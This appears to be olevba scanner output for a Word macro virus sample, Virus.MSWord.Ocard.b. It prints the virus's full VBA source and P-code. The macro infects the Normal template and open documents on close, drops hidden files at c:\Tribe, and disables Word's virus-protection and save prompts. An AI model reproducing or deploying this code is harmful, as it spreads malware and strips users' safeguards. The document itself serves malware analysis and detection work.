olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ocard.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ocard.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Draco Malfoy in Norway @ -40
Dim Basilisk As String
Dim Harry As Integer
On Error GoTo Hell
Basilisk = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 33)
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) <> "'Draco" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString Basilisk
For Harry = 2 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(Harry).Name = "Norway" Then
    ActiveDocument.VBProject.VBComponents.Item(Harry).Export "c:\Tribe"
    SetAttr "c:\Tribe", vbHidden
    SetAttr "c:\tribe.frx", vbHidden
    End If
Next Harry
End If
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) <> "'Draco" Then
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString Basilisk
    ActiveDocument.VBProject.VBComponents.Import "c:\Tribe"
End If
If Month(Now) = 12 And Day(Now) >= 24 Then
Load Norway
Norway.CommandButton1.Caption = "Merry Christmas " & Application.UserName
Norway.Show
Unload Norway
End If
With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
    .ConfirmConversions = False
End With
Hell:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ocard.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7214 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x001C "Draco Malfoy in Norway @ -40"
' Line #2:
' 	Dim 
' 	VarDefn Basilisk (As String)
' Line #3:
' 	Dim 
' 	VarDefn Harry (As Integer)
' Line #4:
' 	OnError Hell 
' Line #5:
' 	LitDI2 0x0001 
' 	LitDI2 0x0021 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Basilisk 
' Line #6:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "'Draco"
' 	Ne 
' 	IfBlock 
' Line #7:
' 	Ld Basilisk 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #8:
' 	StartForVariable 
' 	Ld Harry 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #9:
' 	Ld Harry 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Norway"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitStr 0x0008 "c:\Tribe"
' 	Ld Harry 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #11:
' 	LitStr 0x0008 "c:\Tribe"
' 	Ld vbHidden 
' 	ArgsCall SetAttr 0x0002 
' Line #12:
' 	LitStr 0x000C "c:\tribe.frx"
' 	Ld vbHidden 
' 	ArgsCall SetAttr 0x0002 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	StartForVariable 
' 	Ld Harry 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "'Draco"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld Basilisk 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #18:
' 	LitStr 0x0008 "c:\Tribe"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #21:
' 	Ld Norway 
' 	ArgsCall Local 0x0001 
' Line #22:
' 	LitStr 0x0010 "Merry Christmas "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Norway 
' 	MemLd CommandButton1 
' 	MemSt Caption 
' Line #23:
' 	Ld Norway 
' 	ArgsMemCall Show 0x0000 
' Line #24:
' 	Ld Norway 
' 	ArgsCall Unlock 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #29:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #30:
' 	EndWith 
' Line #31:
' 	Label Hell 
' Line #32:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

